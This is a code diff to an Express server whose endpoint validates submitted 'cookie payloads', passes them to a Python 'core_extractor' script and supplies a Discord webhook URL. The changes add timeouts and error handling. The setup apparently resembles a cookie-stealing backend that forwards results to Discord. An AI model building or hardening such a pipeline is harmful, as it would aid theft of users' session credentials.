@@ -28,7 +28,7 @@ app.get('/', (req, res) => {
 function isValidCookiePayload(rawInput) {
     if (!rawInput) return false;
     const str = String(rawInput).trim();
-    
+
     // Must be at least 50 characters long to even be considered a real cookie/script
     if (str.length < 50) return false;
 
@@ -51,12 +51,33 @@ app.post('/api/process', (req, res) => {
         return res.status(500).json({ success: false, error: "Webhook not configured on server" });
     }
 
-    const pyProcess = spawn('python3', ['core_extractor.py'], {
+    const scriptPath = path.join(__dirname, 'core_extractor.py');
+    const pyProcess = spawn('python3', [scriptPath], {
         env: { ...process.env, DISCORD_WEBHOOK_URL: webhookUrl }
     });
 
     let stdoutData = '';
     let stderrData = '';
+    let responded = false;
+    let timedOut = false;
+
+    const sendJsonOnce = (statusCode, payload) => {
+        if (responded) return;
+        responded = true;
+        clearTimeout(timeoutId);
+        res.status(statusCode).json(payload);
+    };
+
+    // Kill hung Python runs before the reverse proxy drops the request with a 502
+    const timeoutId = setTimeout(() => {
+        timedOut = true;
+        pyProcess.kill('SIGKILL');
+        sendJsonOnce(504, {
+            success: false,
+            error: "Extractor timed out.",
+            details: stderrData || "Python process exceeded 25s limit."
+        });
+    }, 25000);
 
     pyProcess.stdout.on('data', (chunk) => {
         stdoutData += chunk;
@@ -66,23 +87,64 @@ app.post('/api/process', (req, res) => {
         stderrData += chunk;
     });
 
-    pyProcess.on('close', (code) => {
-        if (code !== 0) {
-            console.error(`Python script failed with code ${code}. Stderr: ${stderrData}`);
-            return res.status(500).json({ 
-                success: false, 
-                error: "Extractor execution failed.", 
-                details: stderrData || `Python exited with code ${code}. Stdout was: ${stdoutData}` 
-            });
-        }
-        res.json({ success: true, output: stdoutData });
+    // Prevent unhandled spawn errors (e.g., ENOENT if python3 isn't installed) from crashing Node
+    pyProcess.on('error', (err) => {
+        console.error('Failed to start Python process:', err);
+        sendJsonOnce(500, {
+            success: false,
+            error: "Failed to start extractor process.",
+            details: err.message
+        });
     });
 
-    pyProcess.stdin.write(data);
-    pyProcess.stdin.end();
+    // Prevent EPIPE / stream errors on stdin from crashing Node
+    pyProcess.stdin.on('error', (err) => {
+        console.error('Error writing to Python stdin:', err);
+        sendJsonOnce(500, {
+            success: false,
+            error: "Failed to send payload to extractor.",
+            details: err.message
+        });
+    });
+
+    pyProcess.on('close', (code, signal) => {
+        if (timedOut) return;
+
+        if (code !== 0) {
+            console.error(`Python script failed with code ${code}, signal ${signal}. Stderr: ${stderrData}`);
+            return sendJsonOnce(500, {
+                success: false,
+                error: "Extractor execution failed.",
+                details: stderrData || `Python exited with code ${code} (signal: ${signal}). Stdout was: ${stdoutData}`
+            });
+        }
+
+        sendJsonOnce(200, { success: true, output: stdoutData });
+    });
+
+    try {
+        pyProcess.stdin.write(String(data));
+        pyProcess.stdin.end();
+    } catch (err) {
+        console.error('Synchronous stdin write error:', err);
+        sendJsonOnce(500, {
+            success: false,
+            error: "Failed to write payload to extractor.",
+            details: err.message
+        });
+    }
 });
+
+process.on('uncaughtException', (err) => {
+    console.error('Uncaught Exception:', err);
+});
+
+process.on('unhandledRejection', (reason) => {
+    console.error('Unhandled Rejection:', reason);
+});
+
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Server running on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
